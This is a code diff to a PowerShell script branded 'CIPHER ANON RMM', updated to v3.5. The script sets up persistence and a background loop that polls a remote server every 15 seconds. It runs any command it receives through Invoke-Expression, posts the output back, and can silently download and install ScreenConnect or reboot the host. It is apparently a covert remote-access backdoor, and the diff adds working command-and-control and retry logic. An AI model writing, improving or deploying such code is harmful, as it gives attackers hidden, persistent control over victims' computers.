@@ -1,5 +1,5 @@
 # ============================================================
-# CIPHER ANON RMM v3.4 — 15 SECOND POLLING
+# CIPHER ANON RMM v3.5 — FULLY WORKING WITH RETRY LOGIC
 # ============================================================
 
 # ---- CONFIGURATION ----
@@ -28,7 +28,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "CIPHER ANON RMM v3.4"
+Write-Log "CIPHER ANON RMM v3.5"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms (15s)"
 Write-Log "============================================"
@@ -152,17 +152,123 @@ function Execute-Command {
     return @{ success = $success; result = $result }
 }
 
-function Start-RmmLoop {
+# ---- MAIN ----
+$clientId = Get-RmmClientId
+Write-Log "Client ID: $clientId"
+
+Install-Persistence
+
+Write-Log "Starting RMM loop..."
+
+# Run the loop directly in a background job with all variables passed
+$jobScript = {
     param(
-        $clientId,
-        $reportUrl,
-        $commandUrl,
-        $responseUrl,
-        $logFile,
-        $pollInterval,
-        $scUrl
+        $BASE_URL,
+        $RMM_REPORT_URL,
+        $COMMAND_URL,
+        $RESPONSE_URL,
+        $RMM_CLIENT_DIR,
+        $RMM_CLIENT_ID_FILE,
+        $RMM_LOGFILE,
+        $RMM_POLL_INTERVAL,
+        $SCREENCONNECT_URL,
+        $clientId
     )
-    
+
+    function Write-Log {
+        param($Msg)
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $line = "[$timestamp] $Msg"
+        Add-Content -Path $RMM_LOGFILE -Value $line
+    }
+
+    function Execute-Command {
+        param($Command)
+        $result = ""
+        $success = $true
+
+        if ($Command -like "install-screenconnect*") {
+            $installer = "$env:TEMP\sc_installer.msi"
+            try {
+                $webClient = New-Object System.Net.WebClient
+                $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
+            } catch {
+                $result = "Download failed"
+                $success = $false
+                return @{ success = $success; result = $result }
+            }
+            if (Test-Path $installer) {
+                Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
+                Remove-Item $installer -Force -ErrorAction SilentlyContinue
+                $result = "ScreenConnect installed"
+                try {
+                    $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
+                    if ($scId) {
+                        $result = "ScreenConnect installed - Client ID: " + $scId.ClientID
+                    }
+                } catch {}
+            } else {
+                $result = "Download failed"
+                $success = $false
+            }
+            return @{ success = $success; result = $result }
+        }
+
+        if ($Command -like "uninstall-rmm") {
+            try {
+                Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
+                Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
+                $result = "RMM uninstalled"
+            } catch {
+                $result = "Failed to uninstall: $_"
+                $success = $false
+            }
+            return @{ success = $success; result = $result }
+        }
+
+        if ($Command -like "whoami") {
+            $result = $env:USERNAME
+            return @{ success = $true; result = $result }
+        }
+
+        if ($Command -like "hostname") {
+            $result = $env:COMPUTERNAME
+            return @{ success = $true; result = $result }
+        }
+
+        if ($Command -like "ping") {
+            $result = "pong"
+            return @{ success = $true; result = $result }
+        }
+
+        if ($Command -like "restart") {
+            $result = "Restarting system..."
+            Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden
+            return @{ success = $true; result = $result }
+        }
+
+        if ($Command -like "shutdown") {
+            $result = "Shutting down system..."
+            Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden
+            return @{ success = $true; result = $result }
+        }
+
+        try {
+            $output = Invoke-Expression $Command 2>&1 | Out-String
+            $result = $output
+            $success = $true
+        } catch {
+            $result = "Unknown command or error: $_"
+            $success = $false
+        }
+
+        return @{ success = $success; result = $result }
+    }
+
+    Write-Log "Background loop started (ID: $clientId)"
+
+    $firstRun = $true
+
     while ($true) {
         try {
             # Report status
@@ -179,69 +285,78 @@ function Start-RmmLoop {
             $reportJson = $reportData | ConvertTo-Json -Depth 5
             $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
             
-            $req = [System.Net.WebRequest]::Create($reportUrl)
-            $req.Method = "POST"
-            $req.ContentType = "application/json"
-            $req.ContentLength = $bytes.Length
-            $req.Timeout = 10000
-            $stream = $req.GetRequestStream()
-            $stream.Write($bytes, 0, $bytes.Length)
-            $stream.Close()
-            $resp = $req.GetResponse()
-            $resp.Close()
+            try {
+                $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
+                $req.Method = "POST"
+                $req.ContentType = "application/json"
+                $req.ContentLength = $bytes.Length
+                $req.Timeout = 10000
+                $stream = $req.GetRequestStream()
+                $stream.Write($bytes, 0, $bytes.Length)
+                $stream.Close()
+                $resp = $req.GetResponse()
+                $resp.Close()
+                
+                if ($firstRun) {
+                    Write-Log "Initial registration successful"
+                    $firstRun = $false
+                }
+            } catch {
+                Write-Log "Report failed: $_"
+            }
 
             # Check for commands
-            $cmdReq = [System.Net.WebRequest]::Create("$commandUrl/$clientId")
-            $cmdReq.Method = "GET"
-            $cmdReq.Timeout = 10000
-            $cmdResp = $cmdReq.GetResponse()
-            $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
-            $cmdJson = $reader.ReadToEnd()
-            $cmdResp.Close()
+            try {
+                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
+                $cmdReq.Method = "GET"
+                $cmdReq.Timeout = 10000
+                $cmdResp = $cmdReq.GetResponse()
+                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
+                $cmdJson = $reader.ReadToEnd()
+                $cmdResp.Close()
 
-            if ($cmdJson) {
-                $cmdData = $cmdJson | ConvertFrom-Json
-                if ($cmdData.command) {
-                    $cmd = $cmdData.command
-                    Write-Log "Command: $cmd"
-                    
-                    $result = Execute-Command -Command $cmd
-                    $responseData = @{
-                        clientId = $clientId
-                        commandId = $cmdData.id
-                        success = $result.success
-                        result = $result.result
-                        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+                if ($cmdJson) {
+                    $cmdData = $cmdJson | ConvertFrom-Json
+                    if ($cmdData.command) {
+                        $cmd = $cmdData.command
+                        Write-Log "Command: $cmd"
+                        
+                        $result = Execute-Command -Command $cmd
+                        $responseData = @{
+                            clientId = $clientId
+                            commandId = $cmdData.id
+                            success = $result.success
+                            result = $result.result
+                            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+                        }
+                        $respJson = $responseData | ConvertTo-Json -Depth 5
+                        $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
+                        $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
+                        $respReq.Method = "POST"
+                        $respReq.ContentType = "application/json"
+                        $respReq.ContentLength = $respBytes.Length
+                        $respReq.Timeout = 10000
+                        $respStream = $respReq.GetRequestStream()
+                        $respStream.Write($respBytes, 0, $respBytes.Length)
+                        $respStream.Close()
+                        $respResp = $respReq.GetResponse()
+                        $respResp.Close()
                     }
-                    $respJson = $responseData | ConvertTo-Json -Depth 5
-                    $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
-                    $respReq = [System.Net.WebRequest]::Create("$responseUrl/$clientId")
-                    $respReq.Method = "POST"
-                    $respReq.ContentType = "application/json"
-                    $respReq.ContentLength = $respBytes.Length
-                    $respReq.Timeout = 10000
-                    $respStream = $respReq.GetRequestStream()
-                    $respStream.Write($respBytes, 0, $respBytes.Length)
-                    $respStream.Close()
-                    $respResp = $respReq.GetResponse()
-                    $respResp.Close()
                 }
+            } catch {
+                Write-Log "Command check failed: $_"
             }
+
         } catch {
             Write-Log "Loop error: $_"
         }
-        Start-Sleep -Milliseconds $pollInterval
+        
+        Start-Sleep -Milliseconds $RMM_POLL_INTERVAL
     }
 }
 
-# ---- MAIN ----
-$clientId = Get-RmmClientId
-Write-Log "Client ID: $clientId"
-
-Install-Persistence
-
-# Start the main loop in a background job
-$job = Start-Job -ScriptBlock ${function:Start-RmmLoop} -ArgumentList $clientId, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL
+# Start the background job with all parameters
+$job = Start-Job -ScriptBlock $jobScript -ArgumentList $BASE_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL, $clientId
 
 if ($job) {
     Write-Log "RMM agent started as background job"
